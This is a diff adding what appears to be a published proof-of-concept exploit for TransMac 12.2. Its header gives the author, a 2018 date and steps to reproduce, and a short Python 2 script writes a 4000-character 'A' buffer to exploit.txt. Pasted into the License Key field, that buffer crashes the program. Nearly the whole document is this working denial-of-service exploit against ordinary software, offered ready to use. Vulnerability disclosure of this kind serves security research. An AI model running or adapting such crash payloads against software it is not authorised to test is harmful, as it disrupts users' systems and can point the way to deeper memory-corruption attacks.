@@ -1,0 +1,25 @@
+# Exploit Title: TransMac 12.2 - Denial of Service (PoC)
+# Author: Gionathan "John" Reale
+# Discovey Date: 2018-09-26
+# Software Link: http://www.acutesystems.com/tmac/tmsetup.exe
+# Tested Version: 12.2
+# Tested on OS: Windows 7 32-bit
+# Steps to Reproduce: Run the python exploit script, it will create a new 
+# file with the name "exploit.txt". Copy the content from "exploit.txt".
+# Now start the program. When inside the program click "Enter Key"
+# Now paste the contents of "exploit.txt" into the fields:"License Key/Code"
+# Click "OK" and you will see a crash.
+
+#!/usr/bin/python
+   
+buffer = "A" * 4000
+
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
